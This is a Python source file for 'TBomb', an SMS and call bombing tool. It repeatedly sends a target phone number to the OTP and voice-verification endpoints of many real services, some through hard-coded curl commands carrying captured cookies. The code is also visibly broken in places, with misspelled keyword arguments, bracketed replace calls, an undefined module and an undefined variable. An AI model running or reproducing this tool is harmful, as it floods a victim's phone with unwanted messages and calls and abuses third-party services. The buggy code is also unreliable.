from datetime import datetime
import os, hashlib, sys, time, threading, string, random, base64
import urllib.request, urllib.parse, json, requests

def dpndchek():
    try:
        import requests
    except ImportError:
        print("Error - Some dependencies could not be imported")
        print("Type `pip3 install -r requirments.txt` to install all required packages")
        sys.exit()

def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes

country_codes = readisdc()["isdcodes"]

def clerscrn():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def banntext():
    clerscrn()
    print("TBomb")

countinf = 0

def infinite(pn, dl, ch, max):
    global countinf
    while True:
        while os.path.exists("proc.xxx"):
            time.sleep(0.5)
        os.system("touch proc.xxx")
        api = random.choice(ch)
        try:
            ret = getapi(pn, api, 91)
        except Exception:
            ret = False
        if not ret:
            while ch.count(api) > 0:
                ch.remove(api)
            continue
        os.system("rm proc.xxx >/dev/null 2>&1")
        countinf += 1
        time.sleep(float(dl))
        if countinf > maxlim:
            sys.exit()

def chekintr():
    try:
        requests.get("https://www.google.com")
    except Exception:
        print("Poor internet connection detected")
        banntext()
        sys.exit()

def getapi(pn, lim, cc):
    cc = str(cc)
    pn = str(pn)
    lim = int(lim)
    with open("sitedata.json") as file:
        sitedata = json.load(file)["sitedata"]
    #print(sitedata)
    if lim == 0:
        try:
            hyperurl = sitedata["oyorooms"]["hyperurl"]
            hyperurl = hyperurl.replace("#ISDCODE", cc)
            hyperurl = hyperurl.replace["#PHONENO", pn]
            urllib.request.urlopen(hyperurl)
        except (urllib.error.HTTPError, urllib.error.URLError):
            return False
    elif lim == 1:
        try:
            hyperurl = sitedata["delhivery"]["hyperurl"]
            hyperurl = hyperurl.replace["#PHONENO", pn]
            urllib.request.urlopen(hyperurl)
        except (urllib.error.HTTPError, urllib.error.URLError):
            return False
    elif lim == 2:
        try:
            hyperurl = sitedata["confirmtkt"]["hyperurl"]
            hyperurl = hyperurl.replace["#PHONENO", pn]
            urllib.request.urlopen(hyperurl)
        except (urllib.error.HTTPError, urllib.error.URLError):
            return False
    elif lim == 3:
        hyperurl = sitedata["pharmeasy"]["hyperurl"]
        headers = sitedata["pharmeasy"]["headers"]
        data = sitedata["pharmeasy"]["data"]
        data["contactNumber"] = pn
        response = requests.get(hyperurl, heeaders=headers, json=data)
        return response.status_code==200
    elif lim == 4:
        hyperurl = sitedata["heromotorcorp"]["hyperurl"]
        cookies = sitedata["heromotorcorp"]["cookies"]
        headers = sitedata["pharmeasy"]["headers"]
        data = sitedata["pharmeasy"]["data"]
        data["mobile_no"] = pn
        response = requests.get(hyperurl, heeaders=headers, cookies=cookies, data=data)
        return response.status_code==200
    elif lim == 5:
        hyperurl = sitedata["indialends"]["hyperurl"]
        cookies = sitedata["indialends"]["cookies"]
        headers = sitedata["indialends"]["headers"]
        data = sitedata["indialends"]["data"]
        data["jfsdfu14hkgertd"] = pn
        data["ertysvfj74sje"] = cc
        response = requests.get(hyperurl, heeaders=headers, cookies=cookies, data=data)
        return response.status_code==200
    elif lim==6:
        hyperurl = sitedata["flipkart6"]["hyperurl"]
        headers = sitedata["flipkart6"]["headers"]
        data = sitedata["flipkart6"]["data"]
        data["loginId"] = "+" + cc + pn
        response = request.post(hyperurl, headers=headers, json=data)
        return response.status_code==200
    elif lim==7:
        hyperurl = sitedata["flipkart5"]["hyperurl"]
        cookies = sitedata["flipkart5"]["cookies"]
        headers = sitedata["flipkart5"]["headers"]
        data = sitedata["flipkart5"]["data"]
        data["loginId"] = "+" + cc + pn
        response = request.post(hyperurl, headers=headers, cookies=cookies, data=data)
        return response.status_code==200
    elif lim == 8:
        hyperurl = sitedata["ref-r"]["hyperurl"]
        headers = sitedata["ref-r"]["headers"]
        data = sitedata["ref-r"]["data"]
        data["mobile"] = pn
        response = request.post(hyperurl, headers=headers, data=data)
        return response.status_code==200
    elif lim == 9:
        hyperurl = sitedata["practo"]["hyperurl"]
        headers = sitedata["practo"]["headers"]
        data = sitedata["practo"]["data"]
        data["mobile"] = "+" + cc + pn
        response = request.post(hyperurl, headers=headers, data=data)
        return response.text.find("success") != -1 
    elif lim == 10:
        hyperurl = sitedata["pizzahut"]["hyperurl"]
        headers = sitedata["pizzahut"]["headers"]
        data = sitedata["pizzahut"]["data"]
        data["customer"]["MobileNo"] = pn
        data["customer"]["UserName"] = pn
        response = request.post(hyperurl, headers=headers, data=data)
        return response.status_code==200
    elif lim == 11:
        hyperurl = sitedata["goibibo"]["hyperurl"]
        headers = sitedata["goibibo"]["headers"]
        data = sitedata["goibibo"]["data"]
        data["mbl"] = pn
        response = request.post(hyperurl, headers=headers, data=data)
        return response.status_code==200
    elif lim == 12:
        hyperurl = sitedata["apollopharmacy"]["hyperurl"]
        headers = sitedata["apollopharmacy"]["headers"]
        data = sitedata["apollopharmacy"]["data"]
        data["mobile"] = pn
        response = request.post(hyperurl, headers=headers, data=data)
        return response.status_code==200
    elif lim == 13:
        hyperurl = sitedata["ajio"]["hyperurl"]
        cookies = sitedata["ajio"]["cookies"]
        headers = sitedata["ajio"]["headers"]
        data = sitedata["ajio"]["data"]
        data["mobileNumber"] = pn
        response = request.post(hyperurl, headers=headers, cookies=cookies, json=data)
        return response.text.find("\"statusCode\":\"1\"") != -1
    elif lim == 14:
        hyperurl = sitedata["altbalaji"]["hyperurl"]
        headers = sitedata["altbalaji"]["headers"]
        data = sitedata["altbalaji"]["data"]
        data["country_code"] = cc
        data["phone_number"] = pn
        response = request.post(hyperurl, headers=headers, json=data)
        return response.text == "24f467b24087ff48c96321786d89c69f"
    elif lim == 15:
        hyperurl = sitedata["aala"]["hyperurl"]
        cookies = sitedata["aala"]["cookies"]
        headers = sitedata["aala"]["headers"]
        data = sitedata["aala"]["data"]
        data["email"] = cc + pn
        response = request.post(hyperurl, headers=headers, cookies=cookies json=data)
        return response.text.find("code:") != -1
    elif lim == 16:
        hyperurl = sitedata["grab"]["hyperurl"]
        data = sitedata["grab"]["data"]
        data["phoneNumber"] = cc + pn
        response = request.post(hyperurl, data=data)
        return response.status_code==200
    elif lim == 100:
        rd = os.popen('curl -s -X GET "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/' +  pn + '?callType=otpOnCall"').read()
        return rd.lower().find("new otp has been") != -1
    elif lim == 101:
        rd = os.popen('curl -s -X POST -d mobile=%2B' + cc + '-' + pn + ' https://marketing.tllms.com/elearn/api/v4/authentications/phone_call').read()
        return rd.lower().find("otp requests exceeded") == -1
    elif lim == 102:
        rd = os.popen('curl -s -X POST -H "Host:www.realestateindia.com" -H "content-length:58" -H "accept:text/html, */*; q=0.01" -H "origin:https://www.realestateindia.com" -H "x-requested-with:XMLHttpRequest" -H "save-data:on" -H "user-agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/x-www-form-urlencoded; charset=UTF-8" -H "referer:https://www.realestateindia.com/thanks.php?newreg" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "cookie:_gat=1" -H "cookie:rei_mem_mobile_verify_status=0" -H "cookie:rei_mem_email_verify_status=N" -H "cookie:rei_mem_block_status=0" -H "cookie:rei_member_country=IN" -H "cookie:rei_paid_status=0" -H "cookie:rei_member_type=1" -H "cookie:rei_member_email=Fakemam%40ril.com" -H "cookie:rei_member_name=Fakeman" -H "cookie:rei_member_id=1547045" -H "cookie:cooki_sess_id=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:name=9q8bsucj6mgvu2dc03bfsvlf07" -H "cookie:_gid=GA1.2.626525909.1560836369" -H "cookie:_ga=GA1.2.1033079331.1560836369" -H "cookie:visitedToken=176961560836367" -d \'action_id=call_to_otp&mob_num=' + pn + '&member_id=1547045\' "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php?sid=0.5983221395805354"').read()
        return rd.lower().find("y") != -1
    elif lim == 103:
        os.system('curl -s -X POST -H "Host:www.olx.in" -H "content-length:44" -H "accept:*/*" -H "x-newrelic-id:VQMGU1ZVDxABU1lbBgMDUlI=" -H "origin:https://www.olx.in" -H "user-agent:Mozilla/5.0 (Linux; Android 5.0.2; SH-04G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "referer:https://www.olx.in/" -H "accept-encoding:gzip, deflate, br" -H "accept-language:en-US,en;q=0.9" -H "cookie:onap=16b1b8f48d4x746d47ab-1-16b1b8f48d4x746d47ab-19-1559537345" -H "cookie:bm_sv=CDB97F50DA6615AC420F3E6E77B04E42~OoX2fAuP7ggcNa0VjzE95FzJNKRdJlW09Hja0/cysIGF1sJoBO7i0ndGXqnTWLaunlyxktHLbE8BSstPCRYn8VdP15lvUxK3ZY9ahXOSgwAidxwXd1jCe5wjIzYbiXp5eKNWfFpowhFbpxloe+SrbiE0YHJVPcCV5bmdsHgPfQc=" -H "cookie:AMP_TOKEN=%24NOT_FOUND" -H "cookie:hint=true" -H "cookie:_gid=GA1.2.369819276.1559535517" -H "cookie:_ga=GA1.2.665688753.1559535517" -H "cookie:ldTd=true" -H "cookie:G_ENABLED_IDPS=google" -H "cookie:HIDE_ONBOARDING_LOCATION=true" -H "cookie:testCookie=testCookie" -H "cookie:ak_bmsc=307C5311FB00A3F4E856AFFE1A9D000B0214BED9E0210000909FF45C1E802067~plFZfbMQGgEDr7OWVe9FvqfT24ZtOVMamtYcaip71IYOrv2+SQ6fokSvMk2Uesz5v1sFfaichbtDgeVSj3te3vXJKezSWgvoVWrK7gfzFrLz1ruBm0MQj01V5CmpaTr6tRgDRSN6bks3nqvOHzR0tA1IoqfDfq2MKtmDjbknCI5FlLYUTwqlnwHowYArfybn2n3yilE6VKHjW+tH8kqjAfH8BGuijpmO9pNkgmIyOeaZIVM3k6FGOL3Wj3jLI8uGaU" -H "cookie:_abck=153BD3D333948A58932748CAC3D4C3F40214BED9E0210000909FF45C18838E05~0~8O+udxdG38sBFTPZpaBL4IGj7eUcKJ1VwAtJ52GMO5E=~-1~-1" -H "cookie:bm_sz=BD665D919F7C6FA8374F196445596436~YAAQ2b4UArpOAwtrAQAAq0qPGwNksHBgphLwDzwfBlwIRQJAG7txmjBo/of7NiAJ93gy/7vBhQ9l5sIKdwtl2j+U4bys2Hhh5tZlZL/jqdnW/JrgmgawcxiunAJ32BbY9UtnFIrNxbbRvzQCYnSwf/cz9a7jURsui7leuLaVm7mQEcHPOtC6g5jrToAMTbdA" -H "cookie:97c09e2aabdfed89b87a3010d7f13c64=353b4f9fd82d26268ad11b2c1e9ae019" -H "cookie:lqstatus=1559536704" -H "cookie:laquesis=pan-26381@a#pan-27752@b#pan-30043@b#pana-26381@b" -d \'{"type":"call","descriptor":"+91' + pn + '"}\' "https://www.olx.in/api/challenges" >/dev/null 2>&1')
        return True
    elif lim == 104:
        rd = os.popen('curl -s -X GET -H "Host:api.magicbricks.com" -H "Connection:keep-alive" -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Safari/537.36" -H "Save-Data:on" -H "Accept:image/webp,image/apng,image/*,*/*;q=0.8" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" "https://api.magicbricks.com/bricks/verifyOnCall.html?mobile=' + pn + '"').read().decode('utf-8')
        return rd.lower().strip().find('callmade') != -1
    elif lim == 106:
        rd = os.popen('curl -s "https://www.myupchar.com/user_profile/resend_otp_via_voice?id=' + pn + '"').read()
        return rd.find("1") != -1
    return False
    